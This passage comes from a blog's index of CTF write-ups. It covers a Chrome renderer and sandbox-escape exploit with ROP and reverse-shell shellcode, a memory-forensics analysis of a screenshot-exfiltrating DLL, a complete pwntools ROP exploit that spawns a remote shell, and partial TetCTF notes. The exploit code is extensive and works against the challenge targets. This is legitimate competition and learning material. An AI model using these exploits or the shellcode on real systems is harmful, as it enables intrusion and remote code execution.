allocated. Only then can we read and write on it.var ctf_ptr = new blink.mojom.CtfInterfacePtr();var ctf_name = blink.mojom.CtfInterface.name;var ctf_rq = mojo.makeRequest(ctf_ptr);Mojo.bindInterface(ctf_name, ctf_rq.handle);(async () =&amp;gt; { await ctf_ptr.resizeVector(0x20/8); await ctf_ptr.write(itof(0x1337133713371337n), 0); // Do pwn here...})();Note that any method call on the interface pointer needs to be await inside an async function. Also, the argument for resizeVector is in double elements, not bytes. Here if I want to allocate 0x20 bytes, I would need to pass in 0x20/8.Now let’s start the great escape…3.2. Exploit Strategy - SandboxThe strategy here is quite straight-forward. It is similar to PlaidCTF 2020 PlaidStore that my teammate ntrung03 also has a write-up here. Basically, the plan is to spray some data structure and hope that we can use the OOB read/write to overwrite the object’s vtable, and then we get code execution by calling the method on our fake vtable.Just like the renderer exploit, we have a few tasks to do before we can get ultimate code execution: We need to figure out the size of the object we want to spray so that we allocate our vectors correspondingly. Here I chose to spray the CtfInterface for simplicity. We need to have a leak to calculate chrome base address. We need to have a write primitive to write our ROP chain or shellcode somewhere, or we need to know the address of the vectors that we control if we decide to write ROP chain/shellcode here.To figure out the size of CtfInterface, we can follow the method that instantiates the object: _ZN7content16CtfInterfaceImpl6CreateEN4mojo15PendingReceiverIN5blink5mojom12CtfInterfaceEEE. It would be easier to follow in a debug build with some symbol, but if not, we can still guess what is the size here 0x0000559e9cc811a0 &amp;lt;+0&amp;gt;: push rbp 0x0000559e9cc811a1 &amp;lt;+1&amp;gt;: mov rbp,rsp 0x0000559e9cc811a4 &amp;lt;+4&amp;gt;: push r15 0x0000559e9cc811a6 &amp;lt;+6&amp;gt;: push r14 0x0000559e9cc811a8 &amp;lt;+8&amp;gt;: push r13 0x0000559e9cc811aa &amp;lt;+10&amp;gt;: push r12 0x0000559e9cc811ac &amp;lt;+12&amp;gt;: push rbx 0x0000559e9cc811ad &amp;lt;+13&amp;gt;: sub rsp,0x68 0x0000559e9cc811b1 &amp;lt;+17&amp;gt;: mov r15,rdi 0x0000559e9cc811b4 &amp;lt;+20&amp;gt;: mov edi,0x20 0x0000559e9cc811b9 &amp;lt;+25&amp;gt;: call 0x559e9e731190 &amp;lt;_Znwm&amp;gt;=&amp;gt; 0x0000559e9cc811be &amp;lt;+30&amp;gt;: mov rbx,raxWe see that edi is 0x20 in the first call here so we can try to allocate our vectors with the same size, and look in gdb if they end up at the same page. They are, indeed :D# Search for the marker valuepwndbg&amp;gt; search --qword -w 0x1337133713371337 0x2d020112d180 0x1337133713371337 0x2d0201230f00 0x1337133713371337 0x2d020134d4f0 0x1337133713371337 0x2d020134d5f0 0x1337133713371337# Search for the vector pointer address. The object will have this.pwndbg&amp;gt; search --qword -w 0x2d020112d180 0x2d0201b4ec08 0x2d020112d180pwndbg&amp;gt; tele 0x2d0201b4ec08-0x2000:0000│ 0x2d0201b4ebe8 ◂— 0x2fd01:0008│ 0x2d0201b4ebf0 ◂— 0xdead016d000002fd02:0010│ 0x2d0201b4ebf8 ◂— 0xdeadbeefdeadbeef03:0018│ 0x2d0201b4ec00 —▸ 0x556bb2e51f90 —▸ 0x556babcf6130 (content::CtfInterfaceImpl::~CtfInterfaceImpl()) ◂— push rbp04:0020│ 0x2d0201b4ec08 —▸ 0x2d020112d180 ◂— 0x133713371337133705:0028│ 0x2d0201b4ec10 —▸ 0x2d020112d1a0 —▸ 0x2d02014835a0 ◂— 0x10000000006:0030│ 0x2d0201b4ec18 —▸ 0x2d020112d1a0 —▸ 0x2d02014835a0 ◂— 0x10000000007:0038│ 0x2d0201b4ec20 ◂— 0x1At this point, we can start looking for leak. An easy value to leak is the vtable address of the interface, because it is an address in the chrome binary. We just need to scan the page for values ending with some value that looks like our vtable (ending with 0xf90, for example here).We can also start an arbitrary read/write primitive here. Because the vtable is right next to the vector pointer, we can alter the vector pointer and search within our allocated vectors to see which one is affected. We then know that we can control its vector for arbitrary read/write. When I did this, I noticed that it may be unstable, so it is best to save the original vector pointer and restore it after we have done read/write.for (var i = 0; i &amp;lt; 20; i++) { var ptr = new blink.mojom.CtfInterfacePtr(); var rq = mojo.makeRequest(ptr); Mojo.bindInterface(ctf_name, rq.handle); await ptr.resizeVector(0x20/8); // Marker value await ptr.write(itof(0x1337133713371337n), 0); await ptr.write(itof(0x414142424343n), 3); not_gc.push(ptr);}let vtable_leak = 0n;let corrupt_ptr = undefined;let corrupt_idx = -1;let rw_ptr = undefined;let restore = -1;for (var ptr of not_gc) { for (var i = 0; i &amp;lt; 50; i++) { let v = ftoi((await ptr.read(i)).value); // Scan for the vtable address ending if (vtable_leak == 0n &amp;amp;&amp;amp; (v &amp;amp; 0xfffn) == offset_leak_sbx) { vtable_leak = v; // This saves the original vector address restore = (await ptr.read(i + 1)).value; // Try to alter the vector pointer and look in our allocated vectors // to see which one we are controlling. await ptr.write(itof(vtable_leak), i + 1); for (var ptr1 of not_gc) { let v1 = ftoi((await ptr1.read(0)).value); if (v1 != 0x1337133713371337n) { rw_ptr = ptr1; await ptr.write(restore, i + 1); break; } } corrupt_idx = i + 1; corrupt_ptr = ptr; break; } } if (vtable_leak) { break; }}async function arb_read(addr) { await corrupt_ptr.write(itof(addr), corrupt_idx); let res = (await rw_ptr.read(0)).value; await corrupt_ptr.write(restore, corrupt_idx); return res;}async function arb_write(addr, value) { await corrupt_ptr.write(itof(addr), corrupt_idx); await rw_ptr.write(itof(value), 0); await corrupt_ptr.write(restore, corrupt_idx);}At this point, it is just a matter of overwriting the vtable to point to our fake vtable, and trigger one of the method in the fake vtable.pwndbg&amp;gt; tele 0x556bb2e51f9000:0000│ 0x556bb2e51f90 —▸ 0x556babcf6130 (content::CtfInterfaceImpl::~CtfInterfaceImpl()) ◂— push rbp01:0008│ 0x556bb2e51f98 —▸ 0x556babcf6160 (content::CtfInterfaceImpl::~CtfInterfaceImpl()) ◂— push rbp02:0010│ 0x556bb2e51fa0 —▸ 0x556babcf6290 ◂— push rbp03:0018│ 0x556bb2e51fa8 —▸ 0x556babcf62f0 ◂— push rbp04:0020│ 0x556bb2e51fb0 —▸ 0x556babcf6330 ◂— push rbp05:0028│ 0x556bb2e51fb8 ◂— 0x0As we can see here, we just need to fake one of these entries and call the method on CtfInterface. I chose to fake the Read method, which is at offset 0x18 of the vtable. To stablize the exploit, I only overwite the vtable of one victim object. It may have a lower chance of triggering but remember, we need to avoid crashing.for (var ptr of not_gc) { if (ptr == corrupt_ptr || ptr == rw_ptr) { continue; } for (var i = 0; i &amp;lt; 50; i++) { let v = ftoi((await ptr.read(i)).value); if (v == vtable_leak) { cnt ++; let fake_vtable = pivot_addr; await ptr.write(itof(fake_vtable), i); break; } } if (cnt &amp;gt; 0) { break; }}At the pivot_addr address, I prepared the fake vtable as well as the ROP chain and shellcode. The ROP chain makes the data section chrome executable, and after that, I just jump to the shellcode below.let rop = [ add_rsp_pop_rbp, 0xdeadbeefn, 0xdeadbeefn, xchg_rax, 0xdeadbeefn, 0xdeadbeefn, // mprotect rwx ROP chain pop_rax, 10n, pop_rdi, page_start, pop_rsi, page_len, pop_rdx, 0x7n, syscall, nop, pivot_addr + BigInt(8 * 21), nop, nop, nop, nop, // 0xcccccccc_ccccccccn, // Reverse shell to localhost:1337 0x16a5f026a58296an, 0x48c58948050f995en, 0x1010101010101b8n, 0x38040103b8485002n, 0x240431480301017en, 0x106aef8948582a6an, 0x36a050fe689485an, 0x6a560b78ceff485en, 0xeb050fef89485821n, 0x69622fb848686aefn, 0x894850732f2f2f6en, 0x34810101697268e7n, 0x56f6310101010124n, 0x4856e601485e086an, 0xf583b6ad231e689n, 0x9090909090909005n];arb_write_array(pivot_addr, rop);// Need to wait for write to populatesetTimeout(async () =&amp;gt; { for (var ptr of not_gc) { if (ptr == corrupt_ptr || ptr == rw_ptr) { continue; } await ptr.read(0); }}, 1000);And here it is, the long waited shellcode execution…Actually Getting The FlagNow that we’ve got both the renderer and sandbox escape exploit working, we need to chain them together and with the kernel exploit to get the flag. There are serveral things I needed to work on while doing this.4.1. Chaining The Renderer and Sandbox EscapeInitially, I was spraying too much in the sandbox escape part, leading to garbage collection. This was not good, because the messed up Partition Alloc still exists in the renderer exploit. I needed to tweak the spray from both parts to a lower number of iterations to not encounter this problem.Secondly, there are some wait duration I had to put in the exploit, because for some reason, the leak and overwrite were not populated right away.4.2. Chaining The Browser and The Kernel ExploitThis was definitely the fun part. We did not realized that there was no networking in the VM until later on, and so we cannot just redirect the browser exploit to a remote address. Instead, we need to send the whole exploit in HTML/JS. This also means that we can’t just pull the kernel exploit from remote, and we need to put it in the HTML too (probably, right?)On another note, I tried connecting to the submission server and copy-paste the HTML/JS exploit. It worked for small files, but for the huge exploit, this did not work. Later, I figured out it was some buffering issue and wrote a submit script for it. Worked flawlessly :DNow for the options of including the kernel exploit: We can write it in shellcode form We can shove it right after the HTML file and execute shellcode to extract it, then run it. We can also just put the source code after the HTML file and extract it, compile it, then run it :DTo save time, I chose the 2nd method, after fighting with remote gcc lacking some stuff. And this did not disappoint us.ConclusionThis has definitely been a wild journey for me, because I have put off learning both PartitionAlloc and chrome sandbox escape for a while. There are several other ideas of solving the challenge I would like to note here: For the renderer exploit, one can control the inlined ArrayBuffer of a TypedArray if it is small enough. This is good enough to achieve arbitrary read/write. I did not know about this until I talked to my friend @kaanezder and @harsh_khuha after the CTF For the sandbox escape, one can choose to rewrite the CommandLine data of chrome to disable the sandbox, and use the renderer exploit again. @tjbecker_ from theori.io has an awesome blog post 5 about thisWhen writing the exploit, I’ve also made some shellcode generator from pwntools to JSArray.You can find the full solution herePlease feel free to find me and discuss on twitter @flyingpassword. I would really like to know how I can improve on the debugging as well as the exploitation.Thank you for reading, and thank you Google CTF for an awesome challenge!Footnote https://dmxcsnsbh.github.io/2020/07/20/0CTF-TCTF-2020-Chromium-series-challenge/ &amp;#8617; https://blog.perfect.blue/Chromium-Fullchain &amp;#8617; https://mem2019.github.io/jekyll/update/2020/07/03/TCTF-Chromium-SBX.html &amp;#8617; https://struct.github.io/partition_alloc.html &amp;#8617; https://blog.theori.io/research/escaping-chrome-sandbox/ &amp;#8617; " }, { "title": "AceBear CTF 19", "url": "/posts/AceBear-CTF-19/", "categories": "CTF, reversing", "tags": "ctf, reversing, malware analysis, memory forensic", "date": "2019-04-09 06:46:23 +0800", "snippet": "I had a lot of fun and a hard time during this CTF, but the challenges are really awesome. I spent the whole time solving one challenge: Incident Response (Misc 1000). In my opinion, this challenge closely resembles a real-life scenario and I’m glad that I’ve learned a lot out of it. So here goes the write up for it!Memory forensics - Identifying the malicious programIn this challenge, we’re given a network capture and a memory dump of a Windows machine. Opening up the network capture, we can see that the majority of it is network activity between 192.168.182.136 (a local IP address) and 13.229.248.109 on port 443. These activities are identified as SSL because it’s on port 443 but there are some data that doesn’t seem to be SSL/TLS, for example: ASCII data at the beginning of packet #13, and there are patterns in most of other packets. This made me think that it’s not really SSL/TLS traffic but custom encrypted data.A useful tool for memory forensics is Volatility. Based on the information gathered from the pcap, we can think of looking at network connections in the dump to identify which process was making it.$ vol.py -f WIN-2VTHJA77HMB-20190313-143547.raw --profile=Win7SP1x86 netscan...0x7f8a98d8 TCPv4 192.168.182.136:49158 13.229.248.109:443 ESTABLISHED 1964 explorer.exe There goes the IP address of the C2 server, and it’s definitely strange that explorer.exe was making internet connections. This highly indicates that explorer.exe was injected with malicious code. We can dump the memory of explorer.exe to find the malicious code if it’s direct injection, or we can examine the DLLs loaded by explorer.exe if it’s DLL injection. Listing the DLLs, we can see a very suspicious one in an uncommon location$ vol.py -f WIN-2VTHJA77HMB-20190313-143547.raw --profile=Win7SP1x86 dlllist -p 1964...0x6eb30000 0x25000 0x1 C:\\Users\\misc\\AppData\\Local\\Temp\\FileProcess.dll...We can then dump these DLLs using the following command:$ vol.py -f WIN-2VTHJA77HMB-20190313-143547.raw --profile=Win7SP1x86 dlldump -p 1964 -D explorer_dll/Now it’s time for some reverse engineering :)Reverse engineering the DLLThis is probably the hardest part. Now that we’ve identified the malicious code, we need to figure out how it encrypts the data, and the flag is probably in the decrypted data. From the network capture, we can see that traffic mostly comes from the client so there is exfiltration going on. These are good hints to identify possible API imports in the DLL: CryptDecrypt, CryptEncrypt and other crypto APIs socket, connect, send to communicate over the network2.1. First glance - static analysisOpening the binary in IDA, we can already see some of these imports. We arrive at the DllMain function and there’s the call to loc_6EB32960. However, this is not a function and IDA failed to identify this as a function. This is the first time that I’ve ever dealt with anti-disassembly and it’s quite interesting to know how this works. If you go to the code being called above and keep going down a little bit, you’ll see an instruction highlighted in red at 6EB32A25. The strange thing is right before that, there a jump to 6EB32A25 + 1, so this can’t be the correct disassembly.Hitting P to create a function at 6EB32960 failed, so to fix this, I undefined the instruction highlighted in red, click on 6EB32A26 (6EB32A25 + 1), pressed C to define this as code and patched the only byte left as nop. Now we can go back to the function prologue and hit P again to define a function. Worked like a charm! At that point, I still wasn’t sure if this would impact the code being run, but it’s nice to be able to see the code in graph mode, so I went on and fix all the remaining failed disassembly using this method. There are a few places with random bytes (indicated by the db instruction) that you can also nop out to fix the disassembly.There’s a few things worth noting in this start function: There are stack strings which looks like base64, but decrypting it yields no readable ascii. It gathers some system information and writing it to sysinfo. It creates 3 threads of functions at the following locations: 6EB31AE0 (Thread1), 6EB31D70 (Thread2) and 6EB32230 (Thread3) Thread1 contains more stack strings and call APIs such as GetDC, GetCompatibleBitmap, BitBlt, which indicates that it may be taking screenshots. Thread2 makes networking APIs call such as htons, socket, connect, send. Thread3 also makes networking APIs call including inet_addr. This can be where the C2 IP address is saved. Diving more into these functions, I figured out more important functions: sub_6EB31050: basically sprintf sub_6EB31090: Write a screenshot to a file. sub_6EB31360: A base64 encode/decode function. sub_6EB31560: Get the current process name sub_6EB31620: A decryption function sub_6EB31820: Send file over the network sub_6EB32180: Run a reverse shell sub_6EB32360: The action is taken based on global boolean variables. Get the IP address of the C2 server and save it into a global variable at 6EB518A0. Get the screen sizes and also store it in global variables. Open directories containing “AppData” in the path. Perform some cryptographic operations. How did I discover those functions? I basically looking at return values from API calls that are stored in global variables and how those global variables are used. For example: Thread3 opens a socket and saves it to a global variable at 6EB50948. Right after that, a function is called and it uses this socket along with the OpenProcessA API with the parameter to C:\\Windows\\System32\\cmd.exe (as a stack string). Global boolean variables are used in if statements to make decisions about the actions being performed. Also notes to increment of some variables because they are used as counters across the threads to also make decisions about actions.The descriptions provided above are really superficial because I also made guesses, but they captures the basic actions being performed.Now let’s put together the pieces.2.2. Putting them all together - Dynamic AnalysisThe tools that I used for dynamic analysis include Procmon, Process Explorer and x64dbg. Debugging the DLLs can be a little bit difficult because it only runs inside explorer.exe. After trying several ways to inject the DLL into explorer.exe without any luck, I ended up using the AppInit_DLLs registry key to load it when explorer.exe is run.2.2.1. File system activitiesMonitoring file system activities, we can see the folders and files that it’s trying to access. There’s a noticeable amount of activities in C:\\Users\\&amp;lt;username&amp;gt;\\AppData\\Roaming\\Microsoft\\Explorer\\ and it’s because it couldn’t find the path. The Explorer folder wasn’t there! This is related to the function all at the very beginning of the DLL. sub_6EB32360 is called to initialized data such as IP addresses and directory to write data to. For some reasons, the function failed to initialized the data as intended because all the boolean variables that I’ve mentioned previously couldn’t be set. Setting breakpoints at CreateFile and WriteFile can reveal the same information in the debugger (which is the actual way that I figured this out.) So I just created the folder myself. If the initialization were successful, a file named sysinfo would have been in the folder, but it was never in there.After that, it runs that initialization function again and finally creates 3 threads with the 3 functions that we’ve found in static analysis. As mentioned before, Thread1 is responsible for taking screenshots and saving them to files. The filenames are unix timestamps, which can also be observed in the pcap. More details are in the next section.Note: If you encounter the same issue, you will need to create the folder manually. Otherwise, you won’t be able to observe the network traffic because there is no data to be sent.2.2.2. Networking activitiesObserving more closely, around the call to send in Thread2, we can see the string “1” being copied and a function call to sub_6EB31820. Inside sub_6EB31820, we can also see API calls to send and the string “2”. Going back to the pcap, we can see packets starting with “1” and “2”, so these indicate the data type being sent.There are 2 significant counters that are used: A SentFileCounter at 6EB51458 and a CurrentFileCounter at 6EB51460. CurrentFileCounter is incremented in Thread1 every time a screenshot is taken, and SentFileCounter is incremented whenever a file is sent in Thread2. When does the data get sent? The data only get sent when the CurrentFileCounter is at least 5. If the SentFileCounter reaches 0x12C, a reverse shell is spawned by Thread3.It is worth noting that there are 2 separated sockets being used: 1 is for the reverse shell in Thread3 and 1 is for sending the screenshots. Setting breakpoints on htons, inet_addr, socket, connect and send will reveal the information being sent over the network. Following are the 2 types of packets being sent that we’ve observed before: one starts with “1” and one starts with “2”.The first packet is the unencrypted filename that we can tell from procmon in the previous section. We still have no idea what the second packet is, but the first few bytes are similar to many of those in the pcap, so this highly indicates that the same encryption key is used.2.2.3. Cryptographic functionsThe decryption function is called a lot of times across the program. Setting breakpoints at CryptDecrypt will just reveal the decrypted data. While debugging, I did notice special strings being passed around.2.2.4. Adding everything upNow that we know the second type of packet is encrypted, we also have the data that the program generated. Opening up the files in a hex editor, we can see that it’s an unencrypted bitmap image.It turns out that the program uses XOR encryption to encrypt the data. The encryption can be observed inside sub_6EB31820 and also by XOR-ing the first few bytes of the encrypted and unencrypted data. The key is stored in a global variable at 6EB51920.Also notice that there is a huge buffer in this function, which is used to store the data being sent over the network.Now we just need to observe the memory that stores the key and we are able to get it.Notice that the length of sent data is 1028 but the buffer is only 1024, so there is a 4-byte header before the actual data starts. In addition, only the first 8 bytes of the key is used. The job now is to parse all the packets sent to the server from the pcap, identifying the packets of type 2 that we need to decrypt and concat them together and XOR-decrypt them.My solution was not able to properly decrypt the packets, but the images still showed up and it was sufficient to see the flag. The images were staggered so I made another script to (somewhat) fix the images. They are still really bad but I was lucky enough to see that flag :DHere is the image before fixing:And here’s the image after fixing:There’s the flag: AceBear{M3m0ry_f0r3nsic_&amp;amp;_M4lwa3r_an4lysis_i5_cool}Also if you look carefully, there’s an URL in the picture in Internet Explorer. I tried going to the URL but it was already down at that point: http://mi5cfl4g.chung96vn.cf/fl4g_mi5cFull solution can be found here: https://github.com/ducphanduyagentp/ourCTFs/tree/master/2019/acebear-ctf-19/misc/incident-responseFuture improvementsThere are several things that I can improve in the future and would have saved me a lot of time looking at this challenge: A quick way to inject the DLL into the process. I spent many hours debugging explorer.exe inside x64dbg and just manually loaded the DLL every time, which was really time-consuming. A quick way to patch the bytes used for anti-RE. I should probably learn idapython :)If you have any questions, please feel free to leave a comment below or reach out to me on Twitter. Thanks for reading!" }, { "title": "Insomnihack Teaser CTF 2019", "url": "/posts/Insomnihack-teaser-CTF-2019/", "categories": "CTF", "tags": "ctf, pwn", "date": "2019-01-21 08:21:38 +0800", "snippet": "This is my exploit for the Onewrite challenge from Insomnihack Teaser CTF 2019.Onewrite - Pwnfrom __future__ import print_functionfrom pwn import *import osGDBSCRIPT = &quot;&quot;&quot;&quot;&quot;&quot;HOST = &#39;onewrite.teaser.insomnihack.ch&#39;PORT = 1337BIN = &#39;./onewrite&#39;PROMPT = &quot;&amp;gt; &quot;STACK = &quot;1&quot;PIE = &quot;2&quot;ADDR = &quot;address : &quot;DATA = &quot;data : &quot;e = ELF(BIN)addrs = { &#39;poprax&#39;: 0x460ac, &#39;poprdxrsi&#39;: 0x484e9, &#39;poprdi&#39;: 0x84fa, &#39;syscall&#39;: 0x6e605, &#39;poprsp&#39;: 0x946a}if os.environ.has_key(&#39;remote&#39;): r = remote(HOST, PORT)else: r = process(e.path)if os.environ.has_key(&#39;debug&#39;): gdb.attach(r, gdbscript=GDBSCRIPT)def overwrite(addr, data, prompt=True): r.recvuntil(ADDR) r.send(str(addr)) r.recvuntil(DATA) r.send(data) if prompt: r.recvuntil(PROMPT) r.sendline(&quot;&quot;)def main(): # Leak stack and return to do_leak r.recvuntil(PROMPT) r.sendline(STACK) stackleak = int(r.recvuntil(&quot;\\n&quot;), 16) print(&quot;stack @ {:#08x}&quot;.format(stackleak)) overwrite(stackleak - 0x8, &#39;\\x15&#39;, prompt=False) # Leak binary r.recvuntil(PROMPT) r.sendline(PIE) binleak = int(r.recvuntil(&quot;\\n&quot;), 16) binbase = binleak - e.symbols[&#39;do_leak&#39;] # Rebase after leak for k in addrs.keys(): addrs[k] += binbase print(&quot;do_leak @ {:#08x}&quot;.format(binleak)) print(&quot;binbase @ {:#08x}&quot;.format(binbase)) # Then keep overwriting it with do_leak # At some point, we need to overwrite that 0 too # Then do_leak will be called consecutively # Overwrite first time nOverwrite = 9 writeaddr = stackleak - 0x8 for i in range(nOverwrite): log.info(&quot;Overwriting {}&quot;.format(i)) writeaddr -= 0x18 overwrite(writeaddr, p64(binleak)) writeaddr += 0x8 for i in range(nOverwrite - 2): log.info(&quot;Overwriting reverse {}&quot;.format(i)) overwrite(writeaddr, p64(binleak)) writeaddr += 0x18 # ropchain # pop rsp # ropchain address # x : /bin/sh # x + 0x08 : 0 # pop rax # 59 # pop rdx; pop rsi # 0 # 0 # pop rdi # x # syscall ropaddr = stackleak + 0x30 overwrite(writeaddr, p64(addrs[&#39;poprsp&#39;])) overwrite(writeaddr + 0x8, p64(ropaddr)) binshaddr = stackleak + 0x10 overwrite(binshaddr, &quot;/bin/sh\\x00&quot;) overwrite(binshaddr + 0x08, p64(0)) log.info(&quot;Write arguments done&quot;) ropchain = p64(addrs[&#39;poprax&#39;]) ropchain += p64(59) ropchain += p64(addrs[&#39;poprdxrsi&#39;]) ropchain += p64(0) ropchain += p64(0) ropchain += p64(addrs[&#39;poprdi&#39;]) ropchain += p64(binshaddr) ropchain += p64(addrs[&#39;syscall&#39;]) ropchain += p64(binleak) for i in range(0, 9): overwrite(ropaddr + i * 8, ropchain[i * 8 : (i + 1) * 8]) log.info(&quot;Write ropchain done&quot;) for _ in range(4): r.recvuntil(&quot; : &quot;) r.sendline(&quot;&quot;) r.interactive() r.close()if __name__ == &#39;__main__&#39;: main()# 1 -&amp;gt; 2 before 0# 2 -&amp;gt; 4 before 0 the second time# 0x7fffffffdf08# 0x7fffffffdef0 0x7fffffffdef8# 0x7fffffffded8 0x7fffffffdee0# 0x7fffffffdec0 0x7fffffffdec8# 0x7fffffffdea8 0x7fffffffdeb0# 0x7fffffffde90 0x7fffffffde98➜ insonimhack remote=1 python exploit.py[!] Did not find any GOT entries[*] &#39;/home/me/tmp/insonimhack/onewrite&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to onewrite.teaser.insomnihack.ch on port 1337: Donestack @ 0x7fff4b937ca0{&#39;poprdxrsi&#39;: 140562253915369, &#39;syscall&#39;: 140562254071301, &#39;poprsp&#39;: 140562253657194, &#39;poprax&#39;: 140562253906092, &#39;poprdi&#39;: 140562253653242}do_leak @ 0x7fd73332aa15binbase @ 0x7fd733322000[*] Overwriting 0[*] Overwriting 1[*] Overwriting 2[*] Overwriting 3[*] Overwriting 4[*] Overwriting 5[*] Overwriting 6[*] Overwriting 7[*] Overwriting 8[*] Overwriting 9[*] Overwriting reverse 0[*] Overwriting reverse 1[*] Overwriting reverse 2[*] Overwriting reverse 3[*] Overwriting reverse 4[*] Overwriting reverse 5[*] Overwriting reverse 6[*] Overwriting reverse 7[*] Write arguments done[*] Write ropchain done0x7fd733390605What do you want to leak ?1. stack2. pie &amp;gt; Nopeaddress : $ data : $ What do you want to leak ?1. stack2. pie &amp;gt; Nopeaddress : $ data : $ $ ls -latotal 96drwxr-xr-x 23 root root 4096 Jan 19 11:01 .drwxr-xr-x 23 root root 4096 Jan 19 11:01 ..drwxr-xr-x 2 root root 4096 Jan 19 10:59 bindrwxr-xr-x 4 root root 4096 Jan 19 11:00 bootdrwxr-xr-x 16 root root 3620 Jan 19 11:01 devdrwxr-xr-x 95 root root 4096 Jan 19 11:55 etcdrwxr-xr-x 14 root root 4096 Jan 19 11:55 homelrwxrwxrwx 1 root root 31 Dec 22 16:30 initrd.img -&amp;gt; boot/initrd.img-4.15.0-1026-gcplrwxrwxrwx 1 root root 31 Dec 22 16:30 initrd.img.old -&amp;gt; boot/initrd.img-4.15.0-1026-gcpdrwxr-xr-x 20 root root 4096 Dec 22 16:29 libdrwxr-xr-x 2 root root 4096 Dec 22 15:52 lib64drwx------ 2 root root 16384 Dec 22 16:09 lost+founddrwxr-xr-x 2 root root 4096 Dec 22 15:52 mediadrwxr-xr-x 2 root root 4096 Dec 22 15:52 mntdrwxr-xr-x 2 root root 4096 Dec 22 15:52 optdr-xr-xr-x 105 root root 0 Jan 19 11:01 procdrwx------ 4 root root 4096 Jan 19 11:45 rootdrwxr-xr-x 25 root root 960 Jan 20 06:45 rundrwxr-xr-x 2 root root 12288 Jan 19 10:59 sbindrwxr-xr-x 5 root root 4096 Jan 19 10:49 snapdrwxr-xr-x 2 root root 4096 Dec 22 15:52 srvdr-xr-xr-x 13 root root 0 Jan 19 11:04 sysdrwxrwxrwt 10 root root 4096 Jan 20 23:35 tmpdrwxr-xr-x 10 root root 4096 Dec 22 15:52 usrdrwxr-xr-x 13 root root 4096 Dec 22 15:59 varlrwxrwxrwx 1 root root 28 Dec 22 16:30 vmlinuz -&amp;gt; boot/vmlinuz-4.15.0-1026-gcplrwxrwxrwx 1 root root 28 Dec 22 16:30 vmlinuz.old -&amp;gt; boot/vmlinuz-4.15.0-1026-gcp$ cd /home$ ls -latotal 56drwxr-xr-x 14 root root 4096 Jan 19 11:55 .drwxr-xr-x 23 root root 4096 Jan 19 11:01 ..drwxr-x--- 3 awe awe 4096 Jan 19 10:48 awedrwxr-x--- 3 blaklis blaklis 4096 Jan 19 10:48 blaklisdrwxr-x--- 3 boogy boogy 4096 Jan 19 10:48 boogydrwxr-x--- 3 coolz0r coolz0r 4096 Jan 19 10:48 coolz0rdrwxr-xr-x 3 daniel daniel 4096 Jan 19 11:55 danieldrwxr-x--- 3 drp3ab0dy drp3ab0dy 4096 Jan 19 10:48 drp3ab0dydrwxr-x--- 3 eboda eboda 4096 Jan 19 10:48 ebodadrwxr-x--- 5 grimmlin grimmlin 4096 Jan 19 11:00 grimmlindrwxr-xr-x 2 root root 4096 Jan 19 10:56 onewritedrwxr-x--- 3 thomas thomas 4096 Jan 19 10:48 thomasdrwxr-x--- 3 ubuntu ubuntu 4096 Jan 19 10:48 ubuntudrwxr-x--- 3 vlad vlad 4096 Jan 19 10:48 vlad$ cd onewrite$ ls -latotal 1004drwxr-xr-x 2 root root 4096 Jan 19 10:56 .drwxr-xr-x 14 root root 4096 Jan 19 11:55 ..-rw-r--r-- 1 root root 220 Apr 4 2018 .bash_logout-rw-r--r-- 1 root root 3771 Apr 4 2018 .bashrc-rw-r--r-- 1 root root 807 Apr 4 2018 .profile-rw-r--r-- 1 root root 48 Jan 19 10:56 flag-rwxr-xr-x 1 root root 1000800 Jan 19 10:56 onewrite$ cat flagINS{one leak, one write, many possibilities...}$ " }, { "title": "TetCTF 19", "url": "/posts/TetCTF-19/", "categories": "CTF", "tags": "ctf, reversing, pwn", "date": "2019-01-01 14:34:45 +0800", "snippet": "This is my write-up for TetCTF 19 Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - BabyfirstWebIQTest2 After looking at the source code, there is a path that we can polute the $level variable to pass. It has to pass several condition check:if (isset($_COOKIE[&#39;saved&#39;]) &amp;amp;&amp;amp; !empty($_COOKIE[&#39;saved&#39;]) &amp;amp;&amp;amp; isset($_COOKIE[&#39;hash&#39;]) &amp;amp;&amp;amp; !empty($_COOKIE[&#39;hash&#39;])){ $saved = base64_decode($_COOKIE[&quot;saved&quot;]); $seed = urldecode(substr($saved, 5 ));}if( md5($GLOBALS[&#39;secret&#39;].$seed) === $_COOKIE[&#39;hash&#39;] ){ $level = $GLOBALS[&quot;seed_key&quot;][$seed]; if ($level === NULL) { $saved = &quot;level=i&amp;amp;&quot;.$saved; $exp = explode(&quot;&amp;amp;&quot;, $saved); foreach($exp as $value) { parse_str($value); } } ...} For this to work: $saved gotta be level=xiii or something similar $seed must not match any valid seed so $level is null So previously $saved is b64encode(&quot;level=xiii&quot;) and so $seed is =xiii Which means md5($GLOBAL[&#39;secret&#39;].&quot;=xiii&quot;) === $_COOKIE[&#39;hash&#39;] But we also knows pairs of hashes/part of plaintext is the seed. f783148cc4750250969e3e1a0336aa43, c2VlZD10cnVl 997ca87069e58013ee1f499c348b686b, c2VlZD10c3U= d81384d795a9f245b7b9081b70fd6dba, c2VlZD1iMG5n dde85171daaf2508d5bb2ec2d0a2859e, c2VlZD1sMHYz a42bb0f900169d78df68390bb4ce4690, c2VlZD1saXZl e530da3436a296a64c95851ba57e22b3, c2VlZD1odWh1 b6f2505760fa81a262458eca297072db, c2VlZD1nZWdl f783148cc4750250969e3e1a0336aa43 997ca87069e58013ee1f499c348b686b d81384d795a9f245b7b9081b70fd6dba dde85171daaf2508d5bb2ec2d0a2859e a42bb0f900169d78df68390bb4ce4690 e530da3436a296a64c95851ba57e22b3 b6f2505760fa81a262458eca297072db PwnEasy webserver This is a webserver written in C/C++. It has several functionalities at the first glance login describe the challenge download server-side code and binary Process requests to the additional endpoints: /secret /login /info /chung96vn Some handle POST requests as well This binary is complex because of C++ but I figured out that it uses asio library Examining strings reveals responses to the requests. I was able to leak the admin password by sending a wrong password of length 0x100. Somehow this input is placed right before the actual admin password and the server echo the wrong password back, therefore leaking the admin password. Logging in reveal more functionalities Submit a payload of (what seems like) an arbitrary length. The payload is placed in a file in info/&amp;lt;ip&amp;gt;/&amp;lt;ip&amp;gt;.txt GET request to the /info entry read the file and responds with it. However, this endpoint checks if the ip GET param starts with the IP address of the request. If it doesn’t, the request is disregarded. Tracing the binary and threads I was able to see what’s passed into the functions and syscalls. It uses some like stat, openat. Attempt to do path traversal was not successful. Maybe this is a race condition because it open files and write to it? What if we write different stuffs to the file multiple times in a short duration. Yeah there was a race, but 